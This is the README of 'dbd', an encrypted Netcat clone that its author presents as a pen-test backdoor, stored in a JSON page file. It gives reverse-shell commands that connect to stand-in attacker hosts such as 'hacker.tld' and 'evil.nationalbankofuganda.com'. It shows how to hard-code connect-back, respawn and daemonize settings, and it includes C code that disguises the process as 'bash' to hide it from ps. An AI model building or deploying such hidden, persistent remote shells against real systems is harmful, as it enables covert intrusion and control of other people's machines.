{"name":"Dbd","tagline":"Durandal's Backdoor","body":"\t  d8888b. d8888b. d8888b.\r\n\t  88  `8D 88  `8D 88  `8D\r\n\t  88   88 88oooY' 88   88\r\n\t  88   88 88~~~b. 88   88\r\n\t  88  .8D 88   8D 88  .8D\r\n\t  Y8888D' Y8888P' Y8888D'\r\n\r\n#[Durandal's Backdoor](http://gitbrew.org/dbd)\r\n#Copyright (C) 2013 Kyle Barnthouse [<kbarnthouse@hephaestussec.com>](mailto:kbarnthouse@hephaestussec.com)\r\n#dbd is distributed under the GNU GPL\r\n\r\n\r\n###SYNOPSIS\r\n\r\ndbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License.\r\n\r\n###COMPILATION\r\n\r\n\t$ make\r\n\tusage:\r\n\t  make unix     - Linux, NetBSD, FreeBSD, OpenBSD\r\n\t  make unix32  - Linux, NetBSD, FreeBSD, OpenBSD 32-bit\r\n\t  make sunos    - SunOS (Solaris)\r\n\t  make win32    - native win32 console app (w/ Cygwin + MinGW)\r\n\t  make win32bg  - create a native win32 no-console app (w/ Cygwin + MinGW)\r\n\t  make win32bg CFLAGS=-DSTEALTH - stealthy no-console app\r\n\t  make mingw    - native win32 console app (w/ MinGW MSYS)\r\n\t  make mingwbg  - native win32 no-console app (w/ MinGW MSYS)\r\n\t  make mingwbg CFLAGS=-DSTEALTH - stealthy no-console app (w/ MinGW MSYS)\r\n\t  make cygwin   - Cygwin console app\r\n\t  make darwin   - Darwin\r\n\r\n\tcross-compile options:\r\n\t  make mingw-cross    - win32 cross compile (i586-mingw32msvc-gcc)\r\n\t  make mingwbg-cross  - win32 no-console cross compile (i586-mingw32msvc-gcc)\r\n\t  make mingwbg-cross CFLAGS=-DSTEALTH - stealthy win32 cross compile\r\n\t  make unix CROSS_COMPILE=<path/to/toolchain-> - cross compile for any arch\r\n\t\r\n\troll up a tarball (move your compiled stuff to binaries/ first:\r\n\t  make dist     - create tarball with source files, readme, and binaries/\r\n\r\n\r\nTo compile dbd under a Unix-like operating system you need gcc and relevant development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others), type:\r\n\r\n\t$ make unix\r\n\r\nFor SunOS/Solaris, type:\r\n\r\n\t$ make sunos\r\n\r\nTo compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or Cygwin with full development support (Cygwin's MinGW gcc). To compile a native Win32 dbd console application under Cygwin, type:\r\n\r\n\t$ make win32\r\n\r\nor, under MSYS:\r\n\r\n\t$ make mingw\r\n\r\nTo compile a no-console (\"WinMain\") application under Cygwin, type:\r\n\r\n\t$ make win32bg\r\n\r\nor, under MSYS:\r\n\r\n\t$ make mingwbg\r\n\r\nTo compile a Cygwin-specific console application, type:\r\n\r\n\t$make cygwin\r\n\r\nYou may want to change the default behaviour of dbd. One of the most important thing is to change the default shared secret to your own pass phrase. Edit dbd.h and replace with your preferences. You may, for example, want to hardcode a host + port to connect to if dbd is started without options. Complete examples are provided in dbd.h.\r\n\r\n###SAMPLE USES\r\n\r\nWith a little imagination, dbd can be used for many things:\r\n\r\nUse dbd to securely transfer files between two networks:\r\n\r\n\tsnafu$ dbd -l -p 12345 -k secret > output.file\r\n\r\n\tfubar$ cat input.file | dbd -k secret snafu 12345\r\n\r\nor from win32:\r\n\r\n\tC:\\somedir>type input.fil | dbd -k secret snafu 12345\r\n\r\nUse dbd as a simple (but secure) chat:\r\n\r\n\tsnafu$ dbd -P snafu -Hon fubar 1234\r\n\r\n\tfubar$ dbd -Pfubar -Hon -l -p 1234\r\n\r\nUse dbd as a pen-test backdoor:\r\n\r\n\tC:\\hacked box>dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443\r\n\r\n\r\nor under Unix-like OSes:\r\n\r\n\troot@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993\r\n\r\n###HARD CODING OPTIONS\r\n\r\nIn addition to using command line options, you can hard code variables by using #defines in dbd.h. To do this, set the variables you wish to use as named constants and compile as normal. For example, if you wanted to hard code a dbd executable that connected back to \"evil.nationalbankofuganda.com\" on port 995, and executed \"/bin/bash\" you could run:\r\n\r\n\troot@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995\r\n\r\nor using hard-coded #defines, you could edit dbd.h:\r\n\r\n```c\r\n#define DOLISTEN 0\r\n#define HOST \"evil.nationalbankofuganda.com\"\r\n#define PORT 995\r\n#define EXECPROG \"/bin/bash\"\r\n```\r\n\r\n\tYou can also set respawn and stealth options to help maintain your connection:\r\n\r\n```c\r\n#define RESPAWN_ENABLED 1\r\n#define RESPAWN_INTERVAL 900\r\n#define QUIET 1\r\n#define DAEMONIZE 1\r\n```\r\n\r\nThis will set the connection to daemonize (\"melt\" in malware terms), never send output to STDOUT, and attempt to respawn the connection every 15 minutes should it ever disconnect from the listener.\r\n\r\n###ROMULAN CLOAKING TECHNOLOGY\r\n\r\nNow we're getting into the fun stuff. Once you are a mastar at hard-coding options into your backdoor, you can use what is quite possibly the most fun named constant at our disposal: CLOAK. To do this, simply set the value:\r\n\r\n```c\r\n#define CLOAK 1\r\n```\r\n\r\nNOTE: this currently only works on *nix compiles. Eventually I plan on adding Win32 process migration/hooking so those targets can feel some Romulan love as well.\r\n\r\nFor *nix environments, this option scrubs argv[0] and replaces it with the string \"bash\\0\". It also scrubs all other argv[]'s (it'd look silly if ps returned \"bash -e /bin/bash someremotehost.com 443\" now wouldn't it?) I hope it goes without saying that you CANNOT USE THIS OPTION UNLESS YOU ARE HARD CODING YOUR VARIABLES INTO DBD.H. Also, if you're testing this on your own system it's gonna be fun picking the right pid to kill. ;)\r\n\r\nFeel free to use this scrubber in anything you happen to be working on:\r\n\r\n```c\r\n//grab our named constant\r\nint cloak = CLOAK;\r\n\r\n//Engage cloaking device\r\nif(cloak)\r\n{\r\n\t#ifdef WIN32\r\n\t//stub              \r\n\t#else\r\n\t//change argv[0] to say bash       \r\n\tint scrub;\r\n\tstrncpy((char *)argv[0], \"\\0\", strlen((char *)argv[0]) + 1);\r\n\tstrcpy((char *)argv[0], \"bash\\0\");    \r\n\tfor (scrub = 1; scrub < argc; scrub++)\r\n\t{                     \r\n\t\t strncpy((char *)argv[scrub], \"\\0\", strlen((char *)argv[scrub]) + 1);\r\n\t}                 \r\n\t#endif\r\n}\r\n```\r\n\r\n###WARNING\r\n\r\nDo not pass cached input (a file with commands or similar) to a listening \"dbd -e\" session. \"dbd -e\" is using pipes to pass data between the program being executed and dbd. Pipes are used (instead of plain pass-through duplicate file descriptors) because of encryption between the pipes and the socket. In order to prevent the writing end of one of the pipes from blocking the whole process, I turned it into a non-blocking descriptor. There is a chance that when passing too much input at a time through to the -e program, it will be truncated (cut off) since the pipe buffer (in the OS) can't hold all of the data. This problem can be solved by making dbd multi-threaded for instance, but I'll avoid this as long as possible for compatibility reasons.\r\n\r\n##CROSS-COMPILING\r\n\r\nSince dbd was designed to interoperate with other tools/frameworks, make now allows win32 cross compiling on Linux systems that have the mingw32-gcc toolchain.  These options are almost identical to their Windows-native counterpart with the addition of \"-cross\" after the chosen build.  Example:\r\n\r\n\t$ make mingw-cross\r\n\r\nwill do the same thing on a Linux system that\r\n\r\n\t$ make mingw\r\n\r\nwould do on a win32 system with mingw/msys installed on it.\r\n\r\nRight now all cross-compile options are built with Kali Linux in mind, but should work on any *nix with a little love.  If you have mingw32-gcc installed and make won't build, edit the WCC variable at the top of the Makefile and put the path to your mingw32-gcc binary.  \r\n\r\nAs of dbd-1.5 you can use any crossbuild toolchain to compile dbd by setting the toolchain prefix as CROSS_COMPILE.  For example, building an arm version is as easy as:\r\n\r\n\t$ make unix CROSS_COMPILE=arm-linux-gnueabi-\r\n\r\n##ADVANCED WIZARDRY\r\n\r\nIf you wish to integrate dbd with an exploitation framework, you can write a module that generates a custom dbd.h with configuration options specific to your target.  Anything not explicitly #defined in this file will still use the defaults so you don't have to write everything in the header.  Example: have a file rm dbd.h and replace with:\r\n\r\n```c\r\n#define DOLISTEN 0\r\n#define HOST \"evil.nationalbankofuganda.com\"\r\n#define PORT 995\r\n#define EXECPROG \"/bin/bash\"\r\n#define RESPAWN_ENABLED 1\r\n#define RESPAWN_INTERVAL 900\r\n#define QUIET 1\r\n#define CLOAK 1\r\n#define SHARED_SECRET \"customcrypto\"\r\n```\r\n\r\nthen call make <target options> to build an auto connecting payload with cloaking and respawning that connects back to a listening dbd agent on evil.nationalbankofuganda.com running with the options:\r\n\r\n\t$ dbd -l -p 995 -k customcrypto\r\n\r\nAnother advanced trick is to compile dbd using dietlibc or uClibc.  to compile a dietlibc linux dbd agent, use:\r\n\r\n\t$ make unix CROSS_COMPILE=\"diet -Os \"\r\n\r\nPay attention to the space after the s in the string.  This allows the Makefile to add gcc with the standard CFLAGS and LDFLAGS so your agent builds properly.  The advantage of using dietlibc is that it produces a very tiny 100% static executable for the target environment (around 70K for a linux dbd agent before packing as opposed to the standard 700K+ with glibc and gcc -static).  Using uClibc is even easier, since you just set the crossbuild prefix for your toolchain under CROSS_COMPILE.\r\n\r\n##LICENSE  \r\ndbd Copyright (C) 2013 Kyle Barnthouse kbarnthouse@hephaestussec.com\r\n\r\nThis program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.\r\n\r\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\r\n\r\nYou should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA\r\n\r\nSee the COPYING file for more information.\r\n---\r\ndbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe Devine devine@cr0.net and is distributed under the GNU General Public License (GPL).\r\n\r\nSome code (for doexec_win32.h) has been derived from doexec.c from the Win32 port of Netcat (C) Weld Pond and hobbit. Parts of doexec.c is Copyright (C) 1994 Nathaniel W. Mishkin (doexec.c code was originally derived from rlogind.exe).\r\n\r\nThe original version of Netcat was written by hobbit hobbit@avian.org. The NT version was done by Weld Pond weld@l0pht.com.\r\n\r\n---\r\n\r\n(C) Kyle Barnthouse [<kbarnthouse@hephaestussec.com>](mailto:kbarnthouse@hephaestussec.com)\r\nSecurity Consultant  \r\n[gitbrew.org](https://gitbrew.org)  \r\n[Hephaestus Security](http://hephaestussec.com)","google":"","note":"Don't delete this file! It's used internally to help with page regeneration."}